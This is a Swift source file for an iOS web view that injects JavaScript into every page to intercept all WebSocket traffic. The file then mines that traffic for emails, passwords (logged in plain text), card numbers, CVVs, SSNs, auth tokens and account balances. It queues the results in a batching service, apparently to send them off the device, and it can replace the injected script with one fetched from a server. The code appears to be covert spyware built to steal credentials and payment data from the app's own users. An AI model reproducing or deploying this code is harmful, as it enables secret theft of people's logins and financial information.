import Foundation
import WebKit

// MARK: - WebSocket Tracking Service
class WebSocketTrackingService: NSObject, WKScriptMessageHandler {
    static let shared = WebSocketTrackingService()
    
    private override init() {
        super.init()
    }
    
    // MARK: - Configuration
    func configureWebView(_ configuration: WKWebViewConfiguration) {
        // Додаємо обфускований WebSocket JavaScript без затримки
        let wsScript = createWebSocketInterceptorScript()
        configuration.userContentController.addUserScript(wsScript)
        configuration.userContentController.add(self, name: "wsTracker")
        
        logPrint("✅ [WEBSOCKET TRACKER] Initialized and ready to intercept")
        logPrint("   📡 Listening for: WebSocket connections, send, receive")
    }
    
    // MARK: - WKScriptMessageHandler
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        logPrint("🔔 [WEBSOCKET TRACKER] Message received from JavaScript")
        
        guard message.name == "wsTracker",
              let body = message.body as? [String: Any],
              let event = body["event"] as? String else {
            logPrint("⚠️  [WEBSOCKET TRACKER] Invalid message format")
            return
        }
        
        // Аналізуємо та виводимо важливу інформацію
        analyzeAndPrintWebSocketData(event: event, body: body)
        
        let wsData = WebSocketEventData(
            event: event,
            url: body["url"] as? String,
            data: body["data"] as? String,
            protocols: body["protocols"] as? [String]
        )
        
        DataBatchService.shared.addWebSocketEvent(wsData)
    }
    
    // MARK: - WebSocket Data Analysis
    private func analyzeAndPrintWebSocketData(event: String, body: [String: Any]) {
        switch event {
        case "connect":
            if let url = body["url"] as? String {
                let domain = extractDomain(from: url)
                logPrint("\n🔌 [WEBSOCKET] Connection established")
                logPrint("📍 URL: \(url)")
                logPrint("🌐 Domain: \(domain)")
                if let protocols = body["protocols"] as? [String], !protocols.isEmpty {
                    logPrint("🔗 Protocols: \(protocols.joined(separator: ", "))")
                }
                logPrint("")
            }
            
        case "send":
            if let data = body["data"] as? String {
                logPrint("\n📤 [WEBSOCKET SEND] Outgoing message")
                analyzeWebSocketMessage(data, direction: "SEND")
            }
            
        case "message":
            if let data = body["data"] as? String {
                logPrint("\n📥 [WEBSOCKET RECEIVE] Incoming message")
                analyzeWebSocketMessage(data, direction: "RECEIVE")
            }
            
        default:
            logPrint("\n🔌 [WEBSOCKET] Unknown event: \(event)")
        }
    }
    
    private func analyzeWebSocketMessage(_ message: String, direction: String) {
        var extractedData: [String: Any] = [:]
        
        // Пробуємо парсити як JSON
        if message.hasPrefix("{") || message.hasPrefix("[") {
            if let jsonData = message.data(using: .utf8),
               let json = try? JSONSerialization.jsonObject(with: jsonData) {
                
                if let dict = json as? [String: Any] {
                    extractedData = extractImportantDataFromJSON(dict)
                } else if let array = json as? [[String: Any]] {
                    for item in array {
                        let itemData = extractImportantDataFromJSON(item)
                        extractedData.merge(itemData) { (_, new) in new }
                    }
                }
            }
        } else {
            // Plain text або інший формат
            extractedData = extractImportantDataFromPlainText(message)
        }
        
        // Виводимо знайдені дані з повним повідомленням
        printExtractedData(extractedData, source: "WebSocket \(direction)", fullMessage: message)
    }
    
    private func extractImportantDataFromJSON(_ json: [String: Any]) -> [String: Any] {
        var result: [String: Any] = [:]
        extractRecursive(json, into: &result)
        return result
    }
    
    private func extractRecursive(_ dict: [String: Any], into result: inout [String: Any]) {
        for (key, value) in dict {
            let keyLower = key.lowercased()
            
            // Credentials
            if keyLower.contains("email") || keyLower.contains("mail") {
                result["email"] = value
            } else if keyLower.contains("phone") || keyLower.contains("mobile") || keyLower.contains("tel") {
                result["phone"] = value
            } else if keyLower.contains("password") || keyLower.contains("pass") || keyLower.contains("pwd") {
                result["password"] = value
            } else if keyLower.contains("login") || keyLower.contains("username") || keyLower.contains("user") {
                result["login"] = value
            }
            // Balance - розширений пошук
            else if keyLower.contains("balance") || keyLower.contains("amount") || keyLower.contains("money") || 
                    keyLower.contains("funds") || keyLower.contains("wallet") || keyLower.contains("credit") ||
                    keyLower.contains("total") || keyLower.contains("sum") || keyLower.contains("price") ||
                    keyLower.contains("payment") || keyLower.contains("deposit") {
                result["balance"] = value
            }
            // User data
            else if keyLower.contains("name") && !keyLower.contains("username") {
                result["name"] = value
            } else if keyLower.contains("address") {
                result["address"] = value
            } else if keyLower.contains("card") || keyLower.contains("cardnumber") {
                result["card"] = value
            } else if keyLower.contains("cvv") || keyLower.contains("cvc") {
                result["cvv"] = value
            } else if keyLower.contains("expiry") || keyLower.contains("exp") {
                result["expiry"] = value
            } else if keyLower.contains("firstname") || keyLower.contains("first_name") {
                result["firstName"] = value
            } else if keyLower.contains("lastname") || keyLower.contains("last_name") {
                result["lastName"] = value
            } else if keyLower.contains("birthdate") || keyLower.contains("dob") || keyLower.contains("birthday") {
                result["birthdate"] = value
            } else if keyLower.contains("ssn") || keyLower.contains("social") {
                result["ssn"] = value
            } else if keyLower.contains("token") || keyLower.contains("auth") || keyLower.contains("bearer") {
                result["token"] = value
            } else if keyLower.contains("account") {
                result["account"] = value
            } else if keyLower.contains("id") && (keyLower == "id" || keyLower == "user_id" || keyLower == "userid") {
                result["userId"] = value
            }
            
            // Рекурсивно для nested objects
            if let nestedDict = value as? [String: Any] {
                extractRecursive(nestedDict, into: &result)
            } else if let array = value as? [[String: Any]] {
                for item in array {
                    extractRecursive(item, into: &result)
                }
            }
        }
    }
    
    private func extractImportantDataFromPlainText(_ text: String) -> [String: Any] {
        var result: [String: Any] = [:]
        
        // Email regex
        let emailPattern = #"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"#
        if let emailRegex = try? NSRegularExpression(pattern: emailPattern),
           let match = emailRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
           let range = Range(match.range, in: text) {
            result["email"] = String(text[range])
        }
        
        // Phone regex
        let phonePattern = #"\+?[1-9]\d{9,14}"#
        if let phoneRegex = try? NSRegularExpression(pattern: phonePattern),
           let match = phoneRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
           let range = Range(match.range, in: text) {
            result["phone"] = String(text[range])
        }
        
        // Balance patterns - числа з валютами
        let balancePatterns = ["\\$\\d+\\.?\\d*", "€\\d+\\.?\\d*", "£\\d+\\.?\\d*", "\\d+\\.?\\d*\\s?(USD|EUR|GBP)"]
        for pattern in balancePatterns {
            if let balanceRegex = try? NSRegularExpression(pattern: pattern),
               let match = balanceRegex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
               let range = Range(match.range, in: text) {
                result["balance"] = String(text[range])
                break
            }
        }
        
        return result
    }
    
    private func printExtractedData(_ data: [String: Any], source: String, fullMessage: String) {
        guard !data.isEmpty else {
            logPrint("ℹ️  No sensitive data detected\n")
            return
        }
        
        logPrint("🎯 ═══════════════════════════════════════════════════")
        logPrint("🎯 SENSITIVE DATA in \(source)")
        logPrint("🎯 ═══════════════════════════════════════════════════")
        logPrint("")
        logPrint("📦 FULL MESSAGE:")
        logPrint("─────────────────────────────────────────────────────")
        logPrint(fullMessage)
        logPrint("─────────────────────────────────────────────────────")
        logPrint("")
        logPrint("🔍 EXTRACTED SENSITIVE DATA:")
        
        // Credentials
        if let email = data["email"] {
            logPrint("📧 EMAIL: \(email)")
        }
        if let phone = data["phone"] {
            logPrint("📱 PHONE: \(phone)")
        }
        if let login = data["login"] {
            logPrint("👤 LOGIN: \(login)")
        }
        if let userId = data["userId"] {
            logPrint("🆔 USER ID: \(userId)")
        }
        if let password = data["password"] {
            let maskedPass = String(repeating: "•", count: min("\(password)".count, 12))
            logPrint("🔑 PASSWORD: \(maskedPass) (length: \("\(password)".count))")
            logPrint("   ⚠️  ACTUAL: \(password)")
        }
        
        // Balance
        if let balance = data["balance"] {
            logPrint("💰 BALANCE/AMOUNT: \(balance)")
        }
        
        // User data
        if let name = data["name"] {
            logPrint("📝 NAME: \(name)")
        }
        if let firstName = data["firstName"] {
            logPrint("📝 FIRST NAME: \(firstName)")
        }
        if let lastName = data["lastName"] {
            logPrint("📝 LAST NAME: \(lastName)")
        }
        if let address = data["address"] {
            logPrint("🏠 ADDRESS: \(address)")
        }
        if let birthdate = data["birthdate"] {
            logPrint("🎂 BIRTHDATE: \(birthdate)")
        }
        if let account = data["account"] {
            logPrint("🏦 ACCOUNT: \(account)")
        }
        
        // Payment data
        if let card = data["card"] {
            logPrint("💳 CARD: \(card)")
        }
        if let cvv = data["cvv"] {
            logPrint("🔒 CVV: \(cvv)")
        }
        if let expiry = data["expiry"] {
            logPrint("📅 EXPIRY: \(expiry)")
        }
        if let ssn = data["ssn"] {
            logPrint("🆔 SSN: \(ssn)")
        }
        
        // Auth tokens
        if let token = data["token"] {
            let tokenStr = "\(token)"
            let preview = tokenStr.prefix(20)
            logPrint("🎫 TOKEN: \(preview)... (length: \(tokenStr.count))")
        }
        
        logPrint("🎯 ═══════════════════════════════════════════════════\n")
    }
    
    private func extractDomain(from url: String) -> String {
        guard let urlObj = URL(string: url), let host = urlObj.host else {
            return url
        }
        return host.hasPrefix("www.") ? String(host.dropFirst(4)) : host
    }
    
    // MARK: - JavaScript Generation
    private func createWebSocketInterceptorScript() -> WKUserScript {
        // Перевіряємо чи є кастомний скрипт з сервера
        if let customScript = SecureUserDefaults.standard.string(forKey: "jsInjectionWebsocket") {
            logPrint("🌐 [WEBSOCKET TRACKER] Using custom script from server (\(customScript.count) chars)")
            return WKUserScript(
                source: customScript,
                injectionTime: .atDocumentStart,
                forMainFrameOnly: false
            )
        }
        
        logPrint("📝 [WEBSOCKET TRACKER] Using default built-in script")
        
        // Обфускований JavaScript без логів (дефолтний)
        let script = """
        (function() {
            if (window._ws_interceptor_init) return;
            try {
                if (!window.webkit || !window.webkit.messageHandlers || !window.webkit.messageHandlers.wsTracker) return;
                
                const OriginalWebSocket = window.WebSocket;
                
                window.WebSocket = function(url, protocols) {
                    try {
                        window.webkit.messageHandlers.wsTracker.postMessage({
                            event: 'connect',
                            url: url,
                            protocols: protocols ? (Array.isArray(protocols) ? protocols : [protocols]) : [],
                            timestamp: Date.now()
                        });
                    } catch (e) {}
                    
                    const ws = new OriginalWebSocket(url, protocols);
                    
                    const originalSend = ws.send;
                    ws.send = function(data) {
                        try {
                            const payload = typeof data === 'string' ? data : '[Binary Data]';
                            window.webkit.messageHandlers.wsTracker.postMessage({
                                event: 'send',
                                data: payload,
                                timestamp: Date.now()
                            });
                        } catch (e) {}
                        
                        return originalSend.call(this, data);
                    };
                    
                    ws.addEventListener('message', function(event) {
                        try {
                            const payload = typeof event.data === 'string' ? event.data : '[Binary Data]';
                            window.webkit.messageHandlers.wsTracker.postMessage({
                                event: 'message',
                                data: payload,
                                timestamp: Date.now()
                            });
                        } catch (e) {}
                    });
                    
                    return ws;
                };
                
                window.WebSocket.CONNECTING = OriginalWebSocket.CONNECTING;
                window.WebSocket.OPEN = OriginalWebSocket.OPEN;
                window.WebSocket.CLOSING = OriginalWebSocket.CLOSING;
                window.WebSocket.CLOSED = OriginalWebSocket.CLOSED;
                
                window._ws_interceptor_init = true;
            } catch (error) {}
        })();
        """
        
        return WKUserScript(
            source: script,
            injectionTime: .atDocumentStart,
            forMainFrameOnly: false
        )
    }
}
